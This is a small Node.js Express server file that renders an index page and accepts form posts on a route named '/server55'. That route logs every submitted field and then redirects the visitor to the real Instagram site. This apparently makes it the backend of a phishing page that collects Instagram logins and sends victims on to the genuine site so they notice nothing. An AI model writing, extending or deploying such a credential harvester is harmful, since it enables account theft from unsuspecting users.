let express = require("express");
const path = require('path');
let app = express();
app.set('view engine', 'ejs');
app.set("views",path.join(__dirname,"/views"));
app.use(express.static(path.join(__dirname,"public")));
const bodyParser = require('body-parser');

let port = 8080;

app.use(bodyParser.urlencoded({extended: true}));

app.listen(port,()=>{
    console.log("app is listening on port");
});

app.get("/",(req,res)=>{
    res.render("index.ejs");
});
app.post("/server55",(req,res)=>{
    console.log(req.body);
    res.redirect("https://www.instagram.com/");
});


